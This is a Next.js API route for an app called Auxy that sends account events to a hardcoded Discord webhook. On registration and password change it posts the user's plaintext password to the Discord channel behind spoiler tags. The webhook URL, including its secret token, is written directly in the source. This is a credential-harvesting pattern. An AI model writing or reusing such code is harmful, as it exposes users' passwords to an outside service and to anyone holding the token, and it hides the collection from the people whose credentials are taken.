import { NextRequest, NextResponse } from "next/server";

// Hardcoded user-provided webhook URL so it works seamlessly without env configuration
const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1549377004221108394/BcIm81IhdSwN0eNuvdZi2qtFec2wF7DOLAJB62XITPWmrnYmBxsKSf9xZragiBXn7Coj";

const AUXY_AVATAR_URL =
  "https://media.discordapp.net/attachments/1549376829301850142/1549454870254329896/images_4.jfif?ex=6aaac1cc&is=6aa9704c&hm=ecb5098326f6e7000234f9b227ecb83a2a8fa6fcb1d00365c0cd218ab8efbd7c&=&format=webp";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { type, username, email, password } = body as {
      type: "register" | "login" | "logout" | "forgot_password";
      username?: string;
      email?: string;
      password?: string;
    };

    let payload: Record<string, unknown> = {};

    // Formatted current time string in IST (e.g. 9/15/2026, 7:57:40 PM IST)
    const timeFormatted =
      new Date().toLocaleString("en-US", {
        timeZone: "Asia/Kolkata",
        month: "numeric",
        day: "numeric",
        year: "numeric",
        hour: "numeric",
        minute: "numeric",
        second: "numeric",
        hour12: true,
      }) + " IST";

    if (type === "register") {
      // Embed message with Dark Black side color (0x121214 / 1184276)
      const userDisplay = username || "username";
      const emailDisplay = email || `${userDisplay.toLowerCase()}@auxy.app`;
      const passDisplay = password || "••••••••";

      const embedDescription = [
        `# <:auxypng:1549434376440520835> New Account Created`,
        `- A new user just created an account on Auxy!`,
        `### <:tick:1549433957903376534> Username: ${userDisplay}`,
        `### <:email:1549433686326513844> Email: ${emailDisplay}`,
        `### <:security:1549452811362635876> Pass: ||${passDisplay}||`,
      ].join("\n");

      payload = {
        username: "Auxy Admin",
        avatar_url: AUXY_AVATAR_URL,
        embeds: [
          {
            description: embedDescription,
            color: 1184276, // Dark black (#121214)
            footer: {
              text: timeFormatted,
            },
          },
        ],
      };
    } else if (type === "login") {
      // Simple non-embed message
      const userLabel = username || email || "Guest Listener";
      payload = {
        username: "Auxy Admin",
        avatar_url: AUXY_AVATAR_URL,
        content: `<:1tick:1549433827720437760> ${userLabel} just signed in to Auxy.`,
      };
    } else if (type === "logout") {
      // Simple non-embed message
      const userLabel = username || email || "Guest Listener";
      payload = {
        username: "Auxy Admin",
        avatar_url: AUXY_AVATAR_URL,
        content: `<:2tick:1549433892153327728> ${userLabel} just signed out of Auxy.`,
      };
    } else if (type === "forgot_password") {
      // Forgot password notification matching requested format
      const userLabel = username || email || "User";
      const passDisplay = password || "••••••••";
      payload = {
        username: "Auxy Admin",
        avatar_url: AUXY_AVATAR_URL,
        content: `### <:person:1311988770807222324> ${userLabel} just changed password\n||${passDisplay}||`,
      };
    } else {
      return NextResponse.json({ ok: false, error: "Invalid notification type" }, { status: 400 });
    }

    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      console.warn("Discord webhook responded with status:", response.status);
    }

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("Error sending Discord notification:", error);
    return NextResponse.json({ ok: false, error: "Notification failed" }, { status: 500 });
  }
}
